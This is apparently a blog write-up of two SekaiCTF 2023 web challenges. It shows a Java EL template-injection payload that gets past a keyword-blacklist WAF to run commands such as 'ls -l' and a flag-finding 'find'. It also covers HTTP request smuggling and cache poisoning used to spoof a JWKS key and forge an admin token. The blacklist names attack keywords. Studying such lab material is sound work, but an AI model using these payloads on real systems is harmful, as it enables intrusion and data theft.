# SEKAI CTF 2023 - Web Writeups - Frog-WAF and Chunky

![](https://i.imgur.com/TTWINkD.png)

SekaiCTF is a Capture The Flag event hosted by [Team Project Sekai](https://sekai.team/), with some hardcore members of CTF Community.

Web challenges were fun. Worked in 3, solved 2.

## Challenge: Frog-WAF (29 solves)

![](https://i.imgur.com/oTykjrT.png)

That was a hell of a teamwork with [Regne](https://twitter.com/_regne), [Rafael](https://twitter.com/musebreakz), [Natã](https://twitter.com/EstanislauNata) and [Alisson](https://twitter.com/InfektionCTF).

### First-Look

![](https://i.imgur.com/bKCbPah.png)

In this challenge, you are presented with a Contact List. After adding, it shows the contacts on the top of the page.

![](https://i.imgur.com/5ZHJEUP.png)

Looks like some typical XSS challenge, but there is no bot involved, so it's something else.

We can use the [source-code of the challenge](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/tree/main/web-frog-waf/source) to run locally.

```
$ ./build-docker.sh 
Sending build context to Docker daemon  949.2kB
Step 1/12 : FROM gradle:7.5-jdk11-alpine AS build
 ---> 90b77c8e5ac0
Step 2/12 : COPY --chown=gradle:gradle build.gradle settings.gradle /home/gradle/frogwaf/

... BUNCH OF LINES

Successfully built a688b08fada6
Successfully tagged sekai_web_waffrog:latest
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/////////@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@////////*************@@@@@@@@@@@////////*************(@@@@@@@@
@@@@@@@@@@@@@@@/////*****************************/////********************@@@@@@
@@@@@@@@@@@@@////*///%%%(//////#%#/****************************////%%///*,%%@@@@
@@@@@@@@@@@@////%%////,,,,,,.....,,,%***********************///%//,,,,...,,,%@@@
@@@@@@@@@@@///#%///,,,,,,,,%&/,,,,.,,#********************///%//,,,,,,&&/ &&*%@@
@@@@@@@@@@///%%///,,,,&&&&&&%  &&&,,,,%******************///%//,,,,&&&&&&&&&&%@@
@@@@@@@@/////%///*,,&&&&&&&&&&&&&&&,,,%*****************///%//*,,,&&&&&&&&&&&%@@
@@@@@@@/////(%////,,,&&&&&&&&&&&&(,,,,%*****************///%///,,,,,,&&&&&,,%%@@
@@@@@@///////%%////,,,,,,,,,,,,,,,,,,%****************..*//%%///,,,,,,,,,,(%&@@@
@@@@//////////%%%////,,,,,,,,,,,,,,%/*****************,..*//%%/////,,,,/%%//@@@@
@@@//////////////%%%%/////////(%%#/********************...**//#%%%%%%%%//**/*@@@
@@/////*********///////////////**************************....***************//@@
@@/////*************************************(/********(((****,.*************//(@
@@/////**.(*******************************.(((********.((.****************//(,@@
@@/////*,.((/*****************************..*************,*************//((,..@@
@@@////***(*,,,((//*************************************************//((,,...@@@
@@@@////**,,,...,,,,(((////**************************,....****///(((,,,....%@@@@
@@@@@@///**,,,......,,,,,,,(((((/////////**********////////(((*,,,,.......@@@@@@
@@@@@@@///*,,,,...........,,,,,,,,,,,,,/((((((((((((,,,,,...,,...........@@@@@@@
@@@@@@@@@///,,,,....................,,,,,,,,,,,,,,,,,,.................@@@@@@@@@
@@@@@@@@@@@//,,,,,..................................................,@@@@@@@@@@@
@@@@@@@@@@@@@#/,,,,,..............................................,%@@@@@@@@@@@@
@@@@@@@@@@@@@@@@/,,,,,,........................................,,@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@%,,,,,,,.................................,,,(@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@,,,,,,,,,.......................,,,,,%@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,,,,,,,,,,,,,,,,,,,,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
2023-09-03 15:41:10.974  INFO 1 --- [           main] com.sekai.app.Application                : Starting Application on 5ee0fb50de34 with PID 1 (/opt/frogwaf/frogwaf-0.0.1-SNAPSHOT.jar started by app in /)
... ANOTHER BUNCH OF LINES
2023-09-03 15:48:53.574  INFO 1 --- [nio-1337-exec-1] o.s.web.servlet.DispatcherServlet        : Completed initialization in 18 ms
```

Now, the app is available on http://localhost:1337.

(Judging by the last CTFs I played, hackers are relly addicted to frogs).

### Code Analysis - Dockerfile

First place to look here is the [Dockerfile](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-frog-waf/source/Dockerfile).

```Dockerfile
FROM gradle:7.5-jdk11-alpine AS build

COPY --chown=gradle:gradle build.gradle settings.gradle /home/gradle/frogwaf/
COPY --chown=gradle:gradle src/ /home/gradle/frogwaf/src/
WORKDIR /home/gradle/frogwaf
RUN gradle bootJar

FROM openjdk:11-slim

COPY flag.txt /flag.txt

RUN mv /flag.txt /flag-$(head -n 1000 /dev/random | md5sum | head -c 32).txt

RUN addgroup --system --gid 1000 app && adduser --system --group --uid 1000 app
COPY --chown=app:app --from=build /home/gradle/frogwaf/build/libs/*.jar /opt/frogwaf/
USER app
ENTRYPOINT ["java", "-jar", "/opt/frogwaf/frogwaf-0.0.1-SNAPSHOT.jar"]
```

**Dockerfile Summary**

* Java 11 WebApp
* Flag is in the root directory
* Flag has a random filename suffix
* We must be able to list files in the root dir
* We must be able to read files on the root dir
* Usually, this is an RCE challenge

In my local container:

```
$ docker exec -it sekai_web_waffrog bash -c "ls -l flag*"
-rw-rw-r-- 1 root root 17 Aug 16 16:09 flag-453b00d5b87528dc7324eb2e93c709b5.txt
```

The name is generated at build-time, so it's different on the actual challenge server.

### Code Analysis - Controller

There is a lot of files, so I won't go into details in everyone. Let's see some important files:

**[Contact.java](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-frog-waf/source/src/main/java/com/sekai/app/controller/contact/Contact.java)**
```java
// ... Java verbosities

@Getter
@Setter
@Entity
public class Contact {

    @Id
    @GeneratedValue
    private Long id;

    @NotNull
    @Pattern(regexp = "^[A-Z][a-z]{2,}$")
    private String firstName;

    @NotNull
    @Pattern(regexp = "^[A-Z][a-z]{2,}$")
    private String lastName;

    @NotNull
    @Pattern(regexp = "^[A-Z][a-z]{2,}$")
    private String description;

    @NotNull
    @CheckCountry
    private String country;

}
```

**Contact Summary**
* Restrictive Regex validation for most data fields.
* Custom validation for Country field.

**[CheckCountry.java](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-frog-waf/source/src/main/java/com/sekai/app/controller/contact/CheckCountry.java)**
```java
// ... Java verbosities

@Target({FIELD, METHOD, PARAMETER, ANNOTATION_TYPE, TYPE_USE})
@Retention(RUNTIME)
@Constraint(validatedBy = CountryValidator.class)
@Documented
@Repeatable(CheckCountry.List.class)
public @interface CheckCountry {

    String message() default "Invalid country";

    Class<?>[] groups() default {};

    Class<? extends Payload>[] payload() default {};

    @Target({FIELD, METHOD, PARAMETER, ANNOTATION_TYPE})
    @Retention(RUNTIME)
    @Documented
    @interface List {
        CheckCountry[] value();
    }
}
```

**CheckCountry Summary**

A lot of things, but the important is the line below:

```java
@Constraint(validatedBy = CountryValidator.class)
```

Which takes us to the last piece of important code for now.

**[CountryValidator.java](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-frog-waf/source/src/main/java/com/sekai/app/controller/contact/CountryValidator.java)**
```java
// ... Java verbosities

public class CountryValidator implements ConstraintValidator<CheckCountry, String> {

    @SneakyThrows
    @Override
    public boolean isValid(final String input, final ConstraintValidatorContext constraintContext) {
        if (input == null) {
            return true;
        }

        val v = FrogWaf.getViolationByString(input);
        if (v.isPresent()) {
            val msg = String.format("Malicious input found: %s", v);
            throw new AccessDeniedException(msg);
        }

        val countries = StreamUtils.copyToString(new ClassPathResource("countries").getInputStream(), Charset.defaultCharset()).split("\n");
        val isValid = Arrays.asList(countries).contains(input);

        if (!isValid) {
            val message = String.format("%s is not a valid country", input);
            constraintContext.disableDefaultConstraintViolation();
            constraintContext.buildConstraintViolationWithTemplate(message)
                    .addConstraintViolation();
        }
        return isValid;
    }
}
```

**CountryValidator Summary**
* We get our WAF validation (we will check it later).
* We took a lot of time to find the first attack point, but [Regne](https://twitter.com/_regne) found it.

The vulnerable code is the line below:

```java
constraintContext.buildConstraintViolationWithTemplate(message).addConstraintViolation();
```
The [buildConstraintViolationWithTemplate](https://docs.jboss.org/hibernate/stable/validator/api/org/hibernate/validator/constraintvalidation/HibernateConstraintValidatorContext.html#buildConstraintViolationWithTemplate(java.lang.String)) method processes Java EL. Since we can control part of the message variable, it is basically a [Template Injection](https://codeql.github.com/codeql-query-help/java/java-insecure-bean-validation/) for us.

### Payload - The Basics

To make it simpler, let's make some valid Payloads, except for the Country, which is our attack surface.

I don't remember how we got that `message` was a variable interpreted in the EL.
Let's test some payloads on `/addContact` route.

- Payload
```json
{
    "firstName":"Hey",
    "lastName":"You",
    "description":"Abc",
    "country":"{message}"
}
```

- Response:
```json
{
    "violations": [
        {
            "fieldName": "country",
            "message": "Invalid country is not a valid country"
        }
    ]
}
```

`Invalid country` is the default return value of the [`message`](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/42289630c7c3e803c40675e8463dbd17baed6e23/web-frog-waf/source/src/main/java/com/sekai/app/controller/contact/CheckCountry.java#L21) method on the [CheckCountry.java](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-frog-waf/source/src/main/java/com/sekai/app/controller/contact/CheckCountry.java) interface.

By using the dollar sign, we start to play better games using our `message` variable.

- Payload
```json
{
    "firstName":"Hey",
    "lastName":"You",
    "description":"Abc",
    "country":"${message.getClass().toString()}"
}
```

- Response:
```json
{
    "violations": [
        {
            "fieldName": "country",
            "message": "class java.lang.String is not a valid country"
        }
    ]
}
```

Nice. So, let's just use [EL to get RCE](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/el-expression-language#rce) using the Runtime class, right?
**W**ait **A** **F**reaking minute...

### Code Analysis - WAF

![](https://i.imgur.com/dW0aESI.png)

Now is the time we arrive on the challenge name, which is the [WAF](https://www.cloudflare.com/learning/ddos/glossary/web-application-firewall-waf/).
Let's take a look at the WAF request Interceptor.

[FrogWaf.java](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-frog-waf/source/src/main/java/com/sekai/app/waf/FrogWaf.java)
```java
// ... Java verbosities

@Configuration
@Order(Integer.MIN_VALUE)
public class FrogWaf implements HandlerInterceptor {
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object obj) throws Exception {
        // Uri
        val query = request.getQueryString();
        if (query != null) {
            val v = getViolationByString(query);
            if (v.isPresent()) {
                throw new AccessDeniedException(String.format("Malicious input found: %s", v));
            }
        }
        return true;
    }

    public static Optional<WafViolation> getViolationByString(String userInput) {
        for (val c : AttackTypes.values()) {
            for (val m : c.getAttackStrings()) {
                if (userInput.contains(m)) {
                    return Optional.of(new WafViolation(c, m));
                }
            }
        }
        return Optional.empty();
    }

}
```

**WAF Summary**

The [`getViolationByString`](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-frog-waf/source/src/main/java/com/sekai/app/waf/FrogWaf.java#L29) function checks if a string contains a violation of the WAF.
It is used when validating the Country.
The `preHandle` function checks the queryString, but it is useless for solving the challenge.

Let's check the WAF rules.

[FrogWaf.java](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-frog-waf/source/src/main/java/com/sekai/app/waf/AttackTypes.java)
```java
// ... Java verbosities

public enum AttackTypes {
    SQLI("\"", "'", "#"),
    XSS(">", "<"),
    OS_INJECTION("bash", "&", "|", ";", "`", "~", "*"),
    CODE_INJECTION("for", "while", "goto", "if"),
    JAVA_INJECTION("Runtime", "class", "java", "Name", "char", "Process", "cmd", "eval", "Char", "true", "false"),
    IDK("+", "-", "/", "*", "%", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9");

    @Getter
    private final String[] attackStrings;

    AttackTypes(String... attackStrings) {
        this.attackStrings = attackStrings;
    }

}
```

**WAF Filters Summary**

OK, now we got a really restrictive filter for a lot of kinds of attacks.
Let's check our previous payload using some of the forbidden keywords.

**Payload**

`${".getClass().forName("java.lang.Runtime").getRuntime().exec("curl http://127.0.0.1:8000")}`

**Response**

`Malicious input found: Optional[WafViolation(attackType=SQLI, attackString=&quot;)]`

The reponse comes as HTML, because we're blocked by the WAF. Let's make it a little simpler:

**Payload**

`${java.lang.Runtime}`

**Response**

`Optional[WafViolation(attackType=JAVA_INJECTION, attackString=Runtime)]`

Some words shall not be spoken.

![](https://i.imgur.com/e3lSaLz.png)

### Bypassing the Java WAF - bit by bit

* **Building blocks**

Although the WAF blocks a lot of important keywords and chars, it allows us some basic important chars:
- Parentheses: `()`
- Dot: `.`
- Brackets: `[]`
- Words outside the blacklist: `lang, size, ..`
- WAF is also case-sensitive (we didn't need it, but could help)

We have to build from here, using [Java Reflection](https://www.baeldung.com/java-reflection), but it gives us a lot of powers.

* **Key Classes**

First of all, two classes will help us get the rest:
- `java.lang.String` (showed in the first payload)
- `java.lang.Class`

To get the Class, we just need another getClass():

**Payload**

`${message.getClass().getClass().toString()}`

**Response**

`class java.lang.Class is not a valid country`

- **Numbers**

We can avoid a lot of basic strings, but we really need numbers.
We came out with a simple (but verbose) solution, using array sizes.

**Payload**

`${[null, null, null, null].size()}`

**Response**

`4 is not a valid country`

- **Dynamic Methods -> Class.forName**

We can call dynamic methods from classes using the `getMethods` method and acessing them by their index.

For finding classes by name to instantiate, we would like to use the Class.forName method, but the `for` and `Name` strings are blocked.

Since forName is the 2nd method of Class, we call get the method by Index.

**Payload**

`${message.getClass().getClass().getMethods()[[null, null].size()]}`

**Response**

`public static java.lang.Class java.lang.Class.forName(java.lang.String) throws java.lang.ClassNotFoundException is not a valid country`

We had to loop through some classes methods to find the right indexes.
Using this same concept, we can call the substring method, from the String class we already have access.

- **Strings - Part 1**

As with numbers, we need strings to compose our calls (like class names for the Class.forName call).
We can't just send strings, because single and double quotes are blocked. We need some existing strings.

At first we have the `message` variable, but we don't have enough of the alphabet in there.

It gets complex here to summarize, but let's try.
Since we can navigate on all methods and fields from classes `java.lang.String` and `java.lang.Class`, and convert their names to String, we can use the substring on them to get most of the alphabet.

To do it, we first built a [dicionary of substring origins](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/61cea40d2db6b2ac14a2652e0b559e7e24225c23/web-frog-waf/2-exploit.py#L69) to compose strings.

Since the plus-sign is also blocked, we can use `String.concat` to make the magic.

It would be something like that ("simplified" version):

`message.getClass().getMethods()[12].toString().substring(12,1).concat(message.getClass().getMethods()[14].toString().substring(40,1))`...

![](https://i.imgur.com/ziPfmEl.png)

- **Strings - Part 2**

Now we don't have all ASCII table, but we have enough alphabet to use `java.lang.Character.toString(int char)`.

That would be something like that to get ASC `A`:

`Class.forName("java.lang.Character").getMethods()[5].invoke(null, 65)`

We can write a [complete string generator](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/61cea40d2db6b2ac14a2652e0b559e7e24225c23/web-frog-waf/2-exploit.py#L116), with any char, bypassing WAF restrictions.

Now we can instantiate any class and call any methods, with any strings and numbers as parameters.

### Running commands

We can compose the components to use `java.lang.Runtime` to RCE. The plan is to use something like that below.

```java
${message.getClass().forName("java.lang.Runtime").getRuntime().exec("ls")}
```

We need to also read the result of the command, so we have to compose the result of the read (assuming 1-line result, to simplify):

```java
${
    new BufferedReader(
	    new InputStreamReader(
            message.getClass().forName("java.lang.Runtime").getRuntime().exec("ls -l").getInputStream()
        )
    ).readLine();
}
```

When calling `ls -l`, we got the first line.

`total 68 is not a valid country`

This is the number of files in the `/` directory.
RCE is here. Almost there.

### Get the Flag!

For a reason I didn't know at challenge time, commands with some special bash characters (`*`, `|`) were not working. Since the flag name is random, we need to find it.

[Rafael](https://twitter.com/musebreakz) came out with a `find` by permission to get just the flag file name in the first result line.

```bash
find / -maxdepth 1 -type f -perm 0664
```

Result:

`/flag-7662fe897b3335f35ff4c3c81b9e6371.txt`

Now, let's just cat it (locally):

`SEKAI{7357_fl46} is not a valid country`

On the challenge server:

`SEKAI{0h_w0w_y0u_r34lly_b34t_fr0g_wAf_c0ngr4ts!!!!}`

**[Final Exploit](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-frog-waf/2-exploit.py)**

Fun for the whole CTF Family!

### Takeaways

The solution could be probably simpler on the Java side.
For reading the process output, I could maybe read all of the output in one function, without all of the Java usual bullshiting.

I heard later that Runtime class has some issues with special characters we need for bash. I don't know details yet, but that explains why we couldn't just get the flag in a simpler way.

Java has some cool modern stuff, but I only know it from darker times.

Also the final payload got huge! (120k chars)
I saw a much smaller one (24k chars) on Discord.

Just saw the [official solution](https://github.com/project-sekai-ctf/sekaictf-2023/blob/main/web/frog-waf/solution/solve.py) and I think we got somewhat close :) Their solution for numbers was MUCH better.

## Challenge: Chunky (16 solves)

![](https://i.imgur.com/yWbxMYQ.png)

The [source-code of the challenge](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/tree/main/web-chunky/dist) is also available here, so you can follow it locally.

### First-Look

![](https://i.imgur.com/uYaDgOW.png)

![](https://i.imgur.com/mZLufkQ.png)

We basically create posts here and we can see the post content on a URL with the format:

`http://localhost:8080/post/<user_uuid>/<post_uuid>`

On my sample:

`http://localhost:8080/post/0c0b30cf-3d4b-470c-8486-e90ef9d6a778/ffce8a86-652c-4c70-88bb-afa6e182301e`

This is not an XSS challenge, so we will look for a more direct attack.

The post itself is just a boring concatenation of the title with the content.

### Architecture

![](https://i.imgur.com/A6T6epT.png)

- We only have access to the Cache Layer
    - It's a Golang App.
    - Caches contents, except for the Flag.
- There is an nginx as the upstream for the cache
- The Python App is the upstream for the nginx

### Flag Location - Admin

Let's find our objective here: the flag is available only on the blog app. Since there is a lot of code, I wont go into details, but there is a `/admin` path that we need to understand:

```python
from flask import Blueprint, request, session
import os
import jwt
import requests

admin_bp = Blueprint("admin", __name__, url_prefix="/admin")
jwks_url_template = os.getenv("JWKS_URL_TEMPLATE")

valid_algo = "RS256"


def get_public_key_url(user_id):
    return jwks_url_template.format(user_id=user_id)


def get_public_key(url):
    resp = requests.get(url)
    resp = resp.json()
    key = resp["keys"][0]["x5c"][0]
    return key


def has_valid_alg(token):
    header = jwt.get_unverified_header(token)
    algo = header["alg"]
    return algo == valid_algo


def authorize_request(token, user_id):
    pubkey_url = get_public_key_url(user_id)
    if has_valid_alg(token) is False:
        raise Exception(
            "Invalid algorithm. Only {valid_algo} allowed!".format(
                valid_algo=valid_algo
            )
        )

    pubkey = get_public_key(pubkey_url)
    print(pubkey, flush=True)
    pubkey = "-----BEGIN PUBLIC KEY-----\n{pubkey}\n-----END PUBLIC KEY-----".format(
        pubkey=pubkey
    ).encode()
    decoded_token = jwt.decode(token, pubkey, algorithms=["RS256"])
    if "user" not in decoded_token:
        raise Exception("user claim missing!")
    if decoded_token["user"] == "admin":
        return True

    return False


@admin_bp.before_request
def authorize():
    if "user_id" not in session:
        return "User not signed in!", 403

    if "Authorization" not in request.headers:
        return "No Authorization header found!", 403

    authz_header = request.headers["Authorization"].split(" ")
    if len(authz_header) < 2:
        return "Bearer token not found!", 403

    token = authz_header[1]
    if not authorize_request(token, session["user_id"]):
        return "Authorization failed!", 403


@admin_bp.route("/flag")
def flag():
    return os.getenv("FLAG")
```

The `/admin/flag` give us the flag, but the price is an Authorization header with JWT token. This token should be signed with a private RSA key, which we don't have.

The public key for decoding is available for us at the URL:

`http://localhost:8080/any_string/.well-known/jwks.json`

The `any_string` is supposed to be a user uuid, but it does not validate it.

```json
{
    "keys": [
        {
            "alg": "RS256",
            "x5c": [
                "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqwbbx3Ih7YDR+GB9kX+3\nZ/MXkVyj0Bs+E1rCph3XyAEDzft5SgK/xq4SHO48RKl+M17eJirDOnWVvHqnjxyC\nig2Ha/mP+liUBPxNRPbJbXpn9pmbYLR/7LIUvKizL9fYdYyQnACLI1OdAD/PKLjQ\nIAUGi6a8L37VQOjmf6ooLOSwKdNq/aM4eFpciKNZ3gO0YMc6SC17Jt/0L9aegxqt\nVwEXQou1/yisLuzEY6LmKEbTXuX9oSVFzd/FXi2xsLrD4nqI/HAiRoYnK1gAeglw\nF23h8Hc8jYoXgdZowt1+/XuDPfHKsP6f0MLlDaJAML2Ab6fJk3B1YkcrAZap4Zzu\nAQIDAQAB"
            ]
        }
    ]
}
```

OK, the public key is there, but we can't do nothing to use it.

Some things to note here: 
- It gets the validation public key from the same public URL above (with our logged user id). It works as an Authorization Server.
- The flag Authorization is separated the autentication session, which uses a cookie.
- To get the flag, we must call `/admin/flag`, with an Authorization Header that will decode successfully.

### Request Smugling

After many years of guys like you hacking stuff, modern HTTP servers have many security protections, but you can't expect that from small custom projects. That is the cause for our cache server.

When you have multiple web servers working in a chained fashion, we can try a [Request Smuggling](https://portswigger.net/web-security/request-smuggling) approach.

![](https://i.imgur.com/2ptGwMh.png)

I wont explain that in details because it will never get better than guys at [PortSwigger](https://portswigger.net/) did on the link above.

If you want to learn even more, I suggest reading the [excellent Request Smuggling research articles](https://portswigger.net/research/request-smuggling) from PortSwigger research, mostly by the master-hacker-defcon-talker [James Kettle](https://portswigger.net/research/james-kettle) a.k.a. [albinowax](https://twitter.com/albinowax).

To summarize: the custom cache uses the `Content-Length` header to know the size of the post. [The HTTP specification](https://datatracker.ietf.org/doc/html/rfc9112#name-transfer-encoding:~:text=A%20server%20MAY%20reject%20a%20request%20that%20contains%20both%20Content%2DLength%20and%20Transfer%2DEncoding%20or%20process%20such%20a%20request%20in%20accordance%20with%20the%20Transfer%2DEncoding%20alone) says that `Transfer-Encoding` is prioritized over `Content-Length`, but our custom cache just ignored that.

(And now we know why the name of the challenge is `Chunky`)

Nice, we can smuggle requests...

![](https://i.imgur.com/vfYaEeT.png)

### Cache Poisoning

One of the options available with Request Smuggling is [Cache Poisoning](https://portswigger.net/web-security/web-cache-poisoning).

While smuggling the second request `(B)` inside the first one `(A)`, the backend tries to send the `(B)` response, but the font-end does not read it, because it is supposed to have sent the complete answer.

When we send a third request `(C)`, the front-end send it to the backend, but receives the response from `(B)`, which is still enqueued!

If the front-end is a cache - our scenario - it caches the content of `(B)` for the URL of `(C)`.

![](https://i.imgur.com/WA10pDu.png)

OK, let's try it prettier.

![](https://i.imgur.com/WHSSP7y.jpg)

Since this concept may be hard to follow, let's follow the flow on the numbers.
If you look as vertices 4 and 9, we have our first desync: cache sends 1 request, but nginx understands that as 2.
That will result, later, in the vertex 16, where the answer to `/post/C` will be the response of `/post/B` that is waiting to be written to the socket from nginx.

That means, future GETs to post C will get the content of B.

But... we still need to use it to get the flag.

### JWKS Spoofing

Since we have a plan to control the contents of some URLs through Cache Poisoning, we can poison our user JWKS URL with a controlled content.

Now we can use a kind of [JWKS Spoofing](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens#jwks-spoofing),
creating a post content with the same format of the JWKS from the app, but using a public key from a pair created by us :)

Let's view the same diagram again, but with this plan in mind.

![](https://i.imgur.com/FHQotko.jpg)

Now we have a plan.

### Exploiting

The [exploit](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-chunky/attack.py) has some basic functions to `signup`, `login` and `create_post`, that we will need in the attack.

We generated the key-pair [local_key3](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-chunky/local_key3) and [local_key3.pub](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-chunky/local_key3.pub), that we will use to poison our JWKS URL.

3 files that compose the templates of the requests that we will send, as in the Diagram:
- [`desync1.txt`](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-chunky/desync1.txt) == `POST A`
    - Note that it have both the `Content-Length` and `Transfer-Encoding` headers, that will cause our desync.
- [`desync2.txt`](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-chunky/desync1.txt) == `GET /post/<user_uuid>/<post_uuid_of_poisoned_jwks>`
    - We will put here a request to the user content with our fake JWKS.
- [`desync3.txt`](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-chunky/desync1.txt) == `GET /user_uuid/.well-known/jwks.json`
    - That is the legitimate URL that we will poison, with the contents of the previous GET

The complete workflow of the final exploit is:
1. Sign Up new User (command-line argument)
2. Login with new User
3. Create a POST with the content of the injected JWKS Public Key.
4. Perform the [Desync Attack](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/70de611ecaf00b984a104e8fb4168d4412d4f4f2/web-chunky/attack.py#L103) to Poison the Cache with pub key in (3).
5. Test the poisoned cache URL (just for fun)
6. Generate our Token with keys from (3)
7. Call the `/admin/flag` with the token from (6)
8. Close your eyes and pray to Crom and Mitra

Run!!

```
$ python attack.py nep500
===== SIGNUP
/login

===== LOGIN
/

===== POST
URL: /post/e8b30077-4b64-4582-8027-f3bf17b679c1/3d1121b4-02e8-4976-bb47-53787c4b2d96
USER_ID: e8b30077-4b64-4582-8027-f3bf17b679c1
POST_ID: 3d1121b4-02e8-4976-bb47-53787c4b2d96

===== DESYNC!!
[+] Opening connection to localhost on port 8080: Done
===============> First Response (Expect Error 400)
b'<!doctype html>\n<html lang=en>\n<title>Redirecting...</title>\n<h1>Redirecting...</h1>\n<p>You should be redirected automatically to the target URL: <a href="/post/e8b30077-4b64-4582-8027-f3bf17b679c1/9a3fc219-5c92-45d2-9800-efb517f61799">/post/e8b30077-4b64-4582-8027-f3bf17b679c1/9a3fc219-5c92-45d2-9800-efb517f61799</a>. If not, click the link.\n'
===============> End of First Response
===============> Second Response (Expect Fake Key)
b'{"keys": [{"alg": "RS256", "x5c": ["MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoRX6bRm8JoyCYxmWkhMw\\nlK9qdgcINZ7oy9jFNtsa0o+2vIafzsLKpVL3CbRgqQua1I6k1QXsXAS8/FDnTOHb\\nJ8HiJcl6xv//cohwkzKriYzWNF9o0bKl6S2WsAoEuVpB4HDD0kHYHZZsyAwVbHvv\\nNqlrndrYMlhSWLzXD3VK6w7OIMIC3reE7Urlf5oMVA1D8KOcVfuEBcXyb1yYVSnC\\n9Jy2NIGcZD0mlq3zekhR86ex08QqX5DSZ0djVZQIIH0f7JtiU9rM1UZCek+iVTQO\\n6aBs+wHojv2DkM/4AYblDUVUTO3+kgJlJEzIzgUjhTrcNL4Xi+nEKl3Go2Qs4nvH\\n/wIDAQAB\\n-----END PUBLIC KEY-----"]}]}\n'
===============> End of Second Response
==========

===== Test Poisoned Cache!!
200
{"keys": [{"alg": "RS256", "x5c": ["MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoRX6bRm8JoyCYxmWkhMw\nlK9qdgcINZ7oy9jFNtsa0o+2vIafzsLKpVL3CbRgqQua1I6k1QXsXAS8/FDnTOHb\nJ8HiJcl6xv//cohwkzKriYzWNF9o0bKl6S2WsAoEuVpB4HDD0kHYHZZsyAwVbHvv\nNqlrndrYMlhSWLzXD3VK6w7OIMIC3reE7Urlf5oMVA1D8KOcVfuEBcXyb1yYVSnC\n9Jy2NIGcZD0mlq3zekhR86ex08QqX5DSZ0djVZQIIH0f7JtiU9rM1UZCek+iVTQO\n6aBs+wHojv2DkM/4AYblDUVUTO3+kgJlJEzIzgUjhTrcNL4Xi+nEKl3Go2Qs4nvH\n/wIDAQAB\n-----END PUBLIC KEY-----"]}]}

==========

200
SEKAI{1337}
```

On the actual challenge server we got:

`SEKAI{tr4nsf3r_3nc0d1ng_ftw!!}`

### Takeaways

Really fun challenge from a subject I was studying the concepts but never took to practice.
It may get a lot counter-intuitive, but the challenge help me understand this scenario much better.

## References
* Team: [FireShell](https://fireshellsecurity.team/)
* [Team Twitter](https://twitter.com/fireshellst)
* Follow me too :) [@NeptunianHacks](https://twitter.com/NeptunianHacks)
* [Hacktricks - RCE with Expression Language](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/el-expression-language#rce)
* [Java Insecure Bean Validation](https://codeql.github.com/codeql-query-help/java/java-insecure-bean-validation/)
* [WAF](https://www.cloudflare.com/learning/ddos/glossary/web-application-firewall-waf/)
* [Java Reflection](https://www.baeldung.com/java-reflection)
* [Request Smuggling](https://portswigger.net/web-security/request-smuggling)
* [Cache Poisoning](https://portswigger.net/web-security/web-cache-poisoning)
* [JWKS Spoofing](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens#jwks-spoofing)
* [Repo with artifacts discussed here](https://github.com/Neptunians/sekai-ctf-2023-web-writeup)
* [Team Project Sekai](https://sekai.team/)
* [SEKAI CTF 2023 - Official Challenges and Solutions](https://github.com/project-sekai-ctf/sekaictf-2023/)